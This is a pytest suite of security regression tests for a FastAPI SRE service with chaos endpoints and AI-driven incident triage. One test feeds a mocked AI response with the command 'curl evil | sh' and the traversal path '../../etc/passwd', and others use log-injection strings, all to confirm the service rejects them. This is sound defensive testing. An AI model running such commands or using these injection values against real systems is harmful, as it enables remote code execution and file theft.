"""Security regressions from the 2026-11-04 audit (run: make unit)."""
import importlib
import json
import logging
import os
import sys

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "app"))
TOKEN = "t" * 32


def load_app(enabled: bool):
    os.environ["CHAOS_ENABLED"] = "true" if enabled else "false"
    os.environ["CHAOS_TOKEN"] = TOKEN
    import main
    return importlib.reload(main)


@pytest.fixture
def api():
    main = load_app(True)
    yield main, TestClient(main.app)
    main.FAULT_STATE.update(injected_latency_ms=0, injected_error_rate=0.0, circuit_broken=False)


def test_chaos_requires_token(api):
    _, client = api
    assert client.post("/chaos/inject-error?rate=0.5").status_code == 401
    assert client.post("/chaos/inject-error?rate=0.5", headers={"X-Chaos-Token": "wrong"}).status_code == 401
    assert client.post("/chaos/inject-error?rate=0.5", headers={"X-Chaos-Token": TOKEN}).status_code == 200


def test_chaos_disabled_is_404():
    client = TestClient(load_app(False).app)
    assert client.post("/chaos/reset", headers={"X-Chaos-Token": TOKEN}).status_code == 404


def test_latency_is_bounded(api):
    _, client = api
    assert client.post("/chaos/inject-latency?ms=999999999", headers={"X-Chaos-Token": TOKEN}).status_code == 422


def test_untrusted_trace_id_is_replaced(api):
    _, client = api
    r = client.get("/healthz", headers={"X-Trace-ID": 'x" ,"level":"FORGED'})
    assert r.headers["X-Trace-ID"] != 'x" ,"level":"FORGED'
    assert client.get("/healthz", headers={"X-Trace-ID": "trc-abc123"}).headers["X-Trace-ID"] == "trc-abc123"


def test_log_lines_stay_valid_json(api):
    main, _ = api
    record = logging.LogRecord("sre-api", logging.INFO, "", 0, 'GET /"},{"level":"ERROR -> 404', None, None)
    record.trace_id = "abc"
    parsed = json.loads(main.JsonLogFormatter().format(record))
    assert parsed["level"] == "INFO" and parsed["message"].startswith('GET /"}')


def test_security_headers(api):
    _, client = api
    r = client.get("/")
    assert "script-src 'self'" in r.headers["Content-Security-Policy"]
    assert r.headers["X-Frame-Options"] == "DENY"


def test_ai_output_cannot_change_mitigation_command(api):
    main, _ = api
    base = {"title": "t", "root_cause": "r", "impacted_slo": "s", "burn_rate": "b",
            "recommended_runbook": "runbooks/api-down.md", "mitigation_command": "make chaos-reset"}
    raw = json.dumps({"title": "x" * 999, "root_cause": "AI cause", "mitigation_command": "curl evil | sh",
                      "recommended_runbook": "../../etc/passwd"})
    merged = main.merge_ai_analysis(base, raw)
    assert merged["mitigation_command"] == "make chaos-reset"
    assert merged["recommended_runbook"] == "runbooks/api-down.md"
    assert merged["root_cause"] == "AI cause" and len(merged["title"]) == 160


def test_ai_mode_falls_back_to_rules(api, monkeypatch):
    main, client = api
    monkeypatch.setattr(main, "GEMINI_API_KEY", "")
    assert client.post("/api/suite/ai-triage?mode=ai").json()["source"].startswith("rules (AI not configured")
    monkeypatch.setattr(main, "GEMINI_API_KEY", "k")
    monkeypatch.setattr(main, "call_llm", lambda prompt: (_ for _ in ()).throw(RuntimeError("down")))
    main._llm_calls.clear()
    assert client.post("/api/suite/ai-triage?mode=ai").json()["source"] == "rules (AI call failed)"
    monkeypatch.setattr(main, "call_llm", lambda prompt: '{"root_cause": "from model"}')
    main._llm_calls.clear()
    r = client.post("/api/suite/ai-triage?mode=ai").json()
    assert r["source"] == main.GEMINI_MODEL and r["root_cause"] == "from model"
    assert client.post("/api/suite/ai-triage?mode=rules").json()["source"] == "rules"


def test_ai_quota_guard(api):
    main, _ = api
    main._llm_calls.clear()
    assert main.llm_call_allowed(now=1000) is None
    assert "cooldown" in main.llm_call_allowed(now=1001)
